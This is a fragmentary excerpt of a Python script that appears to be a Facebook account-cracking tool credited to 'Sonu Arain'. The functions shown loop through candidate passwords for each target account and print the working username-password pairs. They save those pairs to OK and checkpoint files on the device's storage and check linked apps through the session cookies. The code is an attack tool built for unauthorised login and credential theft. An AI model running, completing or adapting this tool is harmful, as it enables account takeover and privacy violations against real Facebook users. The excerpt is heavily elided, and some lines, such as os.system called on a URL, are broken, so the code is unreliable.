...
===============================================   
\33[1;97m[+] Creater  : Sonu Arain
\33[1;97m[+] Version  : 1.1.01
\33[1;97m[+] GitHub   : https://github.com/jasneetkaur78
===============================================   
'''
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('https://www.facebook.com/afzal.kamboh.1?mibextid=ZbWKwL')
     os.system('https://https://www.facebook.com/afzal.kamboh.1?mibextid=ZbWKwL')
     exit()
    if inpp == "0":
     exit('Exit!')
...
def method():
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\rSONU\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mSONU-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/S0NU-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;91mSONU-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SONU-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        for pword in totalpass:
            ...
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mSONU-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/SONU-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mSONU-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword)
                cpacc.append(acc)
                open('/sdcard/SONU-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
